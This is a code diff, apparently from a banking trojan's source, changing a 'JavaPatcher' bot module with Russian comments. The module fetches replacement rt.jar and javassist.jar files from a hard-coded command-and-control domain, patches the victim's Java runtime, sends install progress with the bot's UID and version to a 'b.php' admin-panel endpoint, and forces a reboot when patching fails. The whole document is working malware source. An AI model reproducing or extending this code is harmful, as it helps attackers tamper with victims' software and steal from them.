@@ -39,7 +39,9 @@ static int javaCompatible = 0; //совместимость явы для разных алгоритмов установ
 static char javaHome[MAX_PATH]; //папка явы
 static char javaMSI[MAX_PATH]; //папка с параметрами автообновления
 
-char versionPatch[] = "1.6"; //версия патча
+char versionPatch[] = "1.7"; //версия патча
+
+static char domain[128]; //адрес админки
 
 static bool PatchIsLoaded();
 
@@ -141,12 +143,13 @@ const char* GetJREPath()
 	return 0;
 }
 
-static PCHAR GetJavaPatcherURL()
+static char* GetJavaPatcherURL( char* url )
 {
 	// Функция возвращает адрес скрипта
 
     #ifdef DEBUGCONFIG
-		return STR::New("http://bifitibsystem.org/");//"http://94.240.148.127/");//);//rt_jar/");
+		m_lstrcpy( url, "http://bifitibsystem.org/" );//"http://94.240.148.127/");//);//rt_jar/");
+		return url;
 	#endif
 
 	PCHAR URL = NULL;
@@ -162,8 +165,20 @@ static PCHAR GetJavaPatcherURL()
 	}
 	while(URL == NULL);
 
-	return URL;
+	if( URL )
+		m_lstrcpy( url, URL );
+	else
+		url[0] = 0;
+	return url;
 }
+
+//инициализирует глобальные переменные 
+static bool InitData()
+{
+	if( GetJavaPatcherURL(domain) == 0 ) return false;
+	return true;
+}
+
 
 //возвращает рабочую папу для патчера, и если указано, то добавляем имя файла
 static char* GetWorkFolder( char* path, const char* fileName = 0 )
@@ -181,25 +196,17 @@ static char* GetWorkFolder( char* path, const char* fileName = 0 )
 	return path;
 }
 
-static void SendLogToAdmin( const char* url, const char* uid, const char* c, const char* v )
+static void SendLogToAdmin( int num )
 {
-	char* qr = STR::New( 7, (char*)url, "b.php?uid=", (char*)uid, "&c=", (char*)c, "&v=", (char*)v );
+	char qr[128];
+	fwsprintfA pwsprintfA = Get_wsprintfA();
+	pwsprintfA( qr, "%sb.php?uid=%s&c=setup_patch&v=%d&jv=%d&botver=%s", domain, BOT_UID, num, javaVersion2, versionPatch  );
 	THTTPResponse Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
 	DBG( "JavaPatcher", "Отсылка лога: %s", qr );
 	HTTPResponse::Clear(&Response);
 	STR::Free(qr);
-}
-
-//отсылка инфы по патчу, если неизвестны урл и уид (для ситем, которые не имеют доступа к дамнному модулю)
-void SendLogToAdmin( const char* c, const char* v )
-{
-	char botUid[100];
-	GenerateUid(botUid);
-	PCHAR adminUrl = GetJavaPatcherURL();
-	SendLogToAdmin( adminUrl, botUid, c, v );
-	STR::Free(adminUrl);
 }
 
 static bool RunCmd( const char* exe, const char* cmd )
@@ -541,7 +548,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, javaExew, crcName ) )
 		return false;
 
-	SendLogToAdmin( "setup_patch", "2" );
+	SendLogToAdmin(2);
 	//загрузка в папку ALLUSERSPROFILE
 	//GetAllUsersProfile( Path, sizeof(Path) );
 	if( GetWorkFolder(Path) == 0 )
@@ -560,7 +567,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 		ss++;
 	}
 
-	SendLogToAdmin( "setup_patch", "3" );
+	SendLogToAdmin(3);
 
 	addUrl = "javassist.jar";
 	crcName = addUrl;
@@ -943,12 +950,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 	char botUid[100];
 	GenerateUid(botUid);
 
-	PCHAR adminUrl = GetJavaPatcherURL(); 
-	PCHAR javaUrl = STR::New( 2, adminUrl, "rt_jar/" );
-	//отсылаем версию бота
-//	SendLogToAdmin( adminUrl, botUid, "botver", version );
-	//сообщаем админке, что ява патч запущен
-//	SendLogToAdmin( adminUrl, botUid, "setup_patch", "0" );
+	PCHAR javaUrl = STR::New( 2, domain, "rt_jar/" );
 
 	DBG( "JavaPatcher", "файлы для патча грузим с %s", javaUrl );
 
@@ -1004,30 +1006,29 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			if( res )
 			{
 				//сообщаем админке, что ява патч установлен
-				SendLogToAdmin( adminUrl, botUid, "setup_patch", "4" );
+				SendLogToAdmin(4);
 			}
 			else //не удалось что-то заменить, делаем перезагрузку
 			{
 				#ifdef KillOs_RebootH
-				SendLogToAdmin( adminUrl, botUid, "setup_patch", "1" );
+				SendLogToAdmin(6);
 				Reboot();
 				#endif
 			}
 		};
 
 	}
-	SendLogToAdmin( adminUrl, botUid, "setup_patch", "5" );
+	SendLogToAdmin(5);
 
-	STR::Free(adminUrl);
 	STR::Free(javaUrl);
 
 	return res;
 };
 
-// Функция отправляет версию ява патчера
-DWORD WINAPI SendJavaPatchVersion(LPVOID)
+// Функция отправляет setup_patch в отдельном потоке
+DWORD WINAPI SendJavaPatchSetupPatch( LPVOID num )
 {
-	SendLogToAdmin( "botver", versionPatch );
+	SendLogToAdmin( (int)num );
 	return 0;
 }
 
@@ -1041,13 +1042,12 @@ DWORD WINAPI Run_Path(LPVOID lpData)
 		{
 			if( File::IsExists(testPath))
 			{
+				InitData();
 				GetJavaVersion();
 				if( javaCompatible >= 0)
 				{
-					SendLogToAdmin( "setup_patch", "1" );
+					SendLogToAdmin(1);
 					StartThread( JavaPatch, NULL );
-					StartThread( SendJavaPatchVersion, NULL );
-					//pSleep(5000); - узнать нафига тут задержка
 				}
 				break;
 			}
@@ -1152,7 +1152,9 @@ void  JavaPatcherSignal()
 
 	if( PatchIsLoaded() ) return; //если патч установлен, то не нужно его повторно ставить
 
-	SendLogToAdmin( "setup_patch", "0" );
+	InitData();
+	GetJavaVersion();
+	StartThread( SendJavaPatchSetupPatch, 0 );
 
 	JavaPatcherAddPidToFile();
 
